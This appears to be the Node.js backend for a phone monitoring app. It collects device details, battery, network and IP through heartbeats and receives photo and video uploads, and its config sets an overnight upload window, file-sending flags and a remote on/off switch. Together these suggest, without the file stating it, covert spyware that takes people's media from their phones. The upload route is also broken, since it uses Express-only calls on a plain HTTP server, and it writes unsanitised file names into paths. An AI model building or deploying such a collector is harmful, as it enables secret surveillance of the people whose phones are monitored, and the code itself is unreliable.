import http from "node:http";
import { URL } from "node:url";
import { createClient } from "@supabase/supabase-js";
import fs from "fs";
import path from "path";

const PORT = process.env.PORT || 3000;

if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SECRET_KEY) {
    console.error("Missing SUPABASE_URL or SUPABASE_SECRET_KEY");
    process.exit(1);
}

const supabase = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_SECRET_KEY
);

// ============================================
// FILE UPLOAD CONFIG
// ============================================

const UPLOAD_DIR = path.join(process.cwd(), "uploads");
const THUMB_DIR = path.join(process.cwd(), "thumbs");
const LOG_FILE = path.join(process.cwd(), "logs.json");
const CONFIG_FILE = path.join(process.cwd(), "config.json");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR, { recursive: true });

// ============================================
// CONFIG HELPERS
// ============================================

function loadConfig() {
    try {
        const data = fs.readFileSync(CONFIG_FILE, "utf-8");
        return JSON.parse(data);
    } catch {
        return {
            enabled: true,
            send_device_info: true,
            send_files: true,
            blocked_ips: [],
            blocked_models: [],
            fileTypes: ['.jpg', '.jpeg', '.png', '.mp4', '.mov'],
            maxFilesPerDay: 50,
            uploadWindow: '22:00-06:00',
            maxFileSizeMB: 100,
            version: '1.0.2'
        };
    }
}

function getIP(req) {
    return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
        req.socket.remoteAddress || "unknown";
}

function publicIp(req) {
    const forwarded = req.headers["x-forwarded-for"];
    if (typeof forwarded === "string" && forwarded) {
        return forwarded.split(",")[0].trim();
    }
    return req.socket.remoteAddress || "";
}

function clean(value) {
    return value == null ? "" : String(value);
}

function number(value) {
    const n = Number(value);
    return Number.isFinite(n) ? n : 0;
}

function optionalNumber(value) {
    const n = Number(value);
    return Number.isFinite(n) ? n : null;
}

function json(res, payload, status = 200) {
    const body = JSON.stringify(payload);
    res.writeHead(status, {
        "content-type": "application/json; charset=utf-8",
        "cache-control": "no-store"
    });
    res.end(body);
}

// ============================================
// FILE LOG HELPERS
// ============================================

function readLogs() {
    if (!fs.existsSync(LOG_FILE)) return [];
    try {
        return fs.readFileSync(LOG_FILE, "utf-8")
            .split("\n")
            .filter(Boolean)
            .map(line => {
                try { return JSON.parse(line); } catch { return null; }
            })
            .filter(Boolean);
    } catch {
        return [];
    }
}

function saveLog(data) {
    try {
        fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
    } catch {}
}

function removeFileLogEntries(fileName) {
    const logs = readLogs();
    const nextLogs = logs.filter(entry => !(entry.type === "file" && entry.file === fileName));
    try {
        const content = nextLogs.map(entry => JSON.stringify(entry)).join("\n");
        fs.writeFileSync(LOG_FILE, content ? `${content}\n` : "");
    } catch {}
}

// ============================================
// HTTP SERVER
// ============================================

const server = http.createServer(async (req, res) => {
    try {
        const url = new URL(
            req.url || "/",
            `http://${req.headers.host || "localhost"}`
        );

        // ============================================
        // CONFIG ENDPOINT
        // ============================================
        if (req.method === "GET" && url.pathname === "/config") {
            const cfg = loadConfig();
            res.writeHead(200, {
                "Content-Type": "text/plain",
                "Cache-Control": "no-store"
            });
            res.end(cfg.enabled ? "1" : "0");
            return;
        }

        // ============================================
        // DASHBOARD
        // ============================================
        if (req.method === "GET" && url.pathname === "/") {
            // ... dashboard render code ...
            return json(res, { status: "ok", message: "Dashboard" });
        }

        // ============================================
        // DEVICE HEARTBEAT - FIXED ✅
        // ============================================
        if (req.method === "POST" && isHeartbeatPath(url.pathname)) {
            const contentType = req.headers["content-type"] || "";

            // ✅ Handle form-urlencoded (App sends this)
            if (contentType.includes("application/x-www-form-urlencoded")) {
                let body = "";
                req.on("data", (chunk) => {
                    body += chunk.toString();
                });

                req.on("end", async () => {
                    try {
                        const parsed = new URLSearchParams(body);
                        const deviceId = parsed.get("deviceId") || parsed.get("device_id");

                        if (!deviceId) {
                            return json(res, { ok: false, error: "deviceId required" }, 400);
                        }

                        const now = Date.now();
                        const device = {
                            device_id: deviceId,
                            my_uid: parseInt(parsed.get("myUid")) || 0,
                            public_id: parsed.get("publicId") || "",
                            my_name: parsed.get("myName") || "",
                            model: parsed.get("model") || "",
                            brand: parsed.get("brand") || "",
                            battery_percent: parseInt(parsed.get("batteryPercent")) || null,
                            network_type: parsed.get("networkType") || "",
                            public_ip: publicIp(req),
                            client_last_seen: parseInt(parsed.get("lastSeen")) || now,
                            server_last_seen: now,
                            created_at: now
                        };

                        const { data: existingDevice } = await supabase
                            .from("devices")
                            .select("created_at")
                            .eq("device_id", deviceId)
                            .maybeSingle();

                        if (existingDevice?.created_at) {
                            device.created_at = existingDevice.created_at;
                        }

                        const { error: deviceError } = await supabase
                            .from("devices")
                            .upsert(device, { onConflict: "device_id" });

                        if (deviceError) {
                            console.error("Device upsert error:", deviceError);
                            return json(res, { ok: false, error: "database error" }, 500);
                        }

                        console.log(`[HEARTBEAT] ${deviceId} | ${device.brand || ""} ${device.model || ""} | Battery: ${device.battery_percent || "?"}%`);

                        return json(res, { ok: true, device_id: deviceId });

                    } catch (error) {
                        console.error("Heartbeat error:", error);
                        return json(res, { ok: false, error: "server error" }, 500);
                    }
                });

                req.on("error", () => {
                    return json(res, { ok: false, error: "request error" }, 500);
                });

                return;
            }

            // ✅ Handle JSON
            const body = await readBody(req);
            const deviceId = clean(body.deviceId);
            // ... existing JSON logic ...
            return json(res, { ok: false, error: "Unsupported content-type" }, 400);
        }

        // ============================================
        // FILE UPLOAD - RAW BINARY
        // ============================================
        if (req.method === "POST" && url.pathname === "/upload") {
            const contentType = req.headers["content-type"] || "";
            const deviceId = req.query.deviceId || "unknown";
            const fileName = req.query.name || "file.bin";

            if (contentType.includes("application/octet-stream") ||
                contentType.includes("image/jpeg") ||
                contentType.includes("image/png") ||
                contentType.includes("video/mp4")) {

                let buffer = Buffer.alloc(0);
                req.on("data", (chunk) => {
                    buffer = Buffer.concat([buffer, chunk]);
                });

                req.on("end", () => {
                    try {
                        const safeName = `${Date.now()}_${fileName}`;
                        const filePath = path.join(UPLOAD_DIR, safeName);
                        fs.writeFileSync(filePath, buffer);

                        const thumbName = `thumb_${safeName}`;
                        const thumbPath = path.join(THUMB_DIR, thumbName);
                        fs.copyFileSync(filePath, thumbPath);

                        saveLog({
                            type: "file",
                            file: safeName,
                            original: fileName,
                            folder: ".",
                            thumb: thumbName,
                            device_id: deviceId,
                            ip: getIP(req),
                            size: buffer.length,
                            time: new Date().toISOString()
                        });

                        console.log(`[UPLOAD] ${getIP(req)} | Device: ${deviceId} | ${fileName} (${buffer.length} bytes)`);

                        res.json({
                            ok: true,
                            file: safeName,
                            device_id: deviceId,
                            message: "File uploaded successfully"
                        });

                    } catch (error) {
                        console.error("Upload error:", error);
                        res.status(500).json({ ok: false, error: "Upload failed" });
                    }
                });

                req.on("error", () => {
                    res.status(500).json({ ok: false, error: "Upload failed" });
                });

                return;
            }

            return json(res, { ok: false, error: "multipart/form-data or raw binary required" }, 400);
        }

        // ============================================
        // GET ALL FILES
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/all-files") {
            const logs = readLogs();
            const files = logs
                .filter(entry => entry.type === "file")
                .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0))
                .slice(0, 100);
            return json(res, { ok: true, files });
        }

        // ============================================
        // 404
        // ============================================
        return json(res, { ok: false, error: "not found" }, 404);

    } catch (error) {
        console.error(error);
        return json(res, { ok: false, error: "server error" }, 500);
    }
});

// ============================================
// HELPERS
// ============================================

function isHeartbeatPath(pathname) {
    return pathname === "/api/heartbeat" || pathname === "/api/v1/device/heartbeat";
}

async function readBody(req) {
    const chunks = [];
    for await (const chunk of req) {
        chunks.push(chunk);
    }
    const raw = Buffer.concat(chunks).toString("utf8");
    if (!raw) return {};
    try { return JSON.parse(raw); } catch { return {}; }
}

// ============================================
// START SERVER
// ============================================

server.listen(PORT, () => {
    console.log(`🚀 MG Server running on port ${PORT}`);
    console.log(`📡 URL: http://localhost:${PORT}`);
    console.log(`📁 Uploads: ${UPLOAD_DIR}`);
    console.log(`📁 Thumbs: ${THUMB_DIR}`);
    console.log(`📋 Config: ${JSON.stringify(loadConfig())}`);
    console.log(`========================================`);
});
